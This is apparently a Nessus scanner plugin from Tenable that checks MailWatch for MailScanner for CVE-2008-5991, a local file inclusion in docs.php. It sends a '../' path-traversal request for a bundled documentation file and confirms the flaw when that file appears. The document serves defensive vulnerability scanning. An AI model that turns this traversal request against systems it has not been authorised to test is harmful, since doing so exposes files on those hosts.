#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34293);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2008-5991");
  script_bugtraq_id(31378);
  script_xref(name:"milw0rm", value:"6552");
  script_xref(name:"OSVDB", value:"48515");

  script_name(english:"MailWatch for MailScanner mailscanner/docs.php doc Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read JpGraph doc");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MailWatch for MailScanner, a web-based
front-end to MailScanner written in PHP. 

The version of MailWatch for MailScanner installed on the remote host
fails to sanitize user-supplied input to the 'doc' parameter of the
'docs.php' script before using it to include PHP code.  Regardless of
PHP's 'register_globals' setting, an unauthenticated attacker may be
able to leverage this issue to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# nb: should be a local file ending in ".html";
file = "jpgraph-1.12.1/docs/index.html";
file_str = "<title>JpGraph Documentation</title>";
traversal = "../";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/mailscanner", "/mailwatch", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Verify the issue with an HTML file that's included in the distribution.
  #
  # nb: we need to remove the ".html" from the file.
  url = string(
    dir, "/docs.php?", 
    "doc=", traversal, substr(file, 0, strlen(file)-6)
  );

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see that file.
  if (file_str >< res)
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue and retrieve the contents of\n",
        "'", file, "' on the remote host using the\n",
        "following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
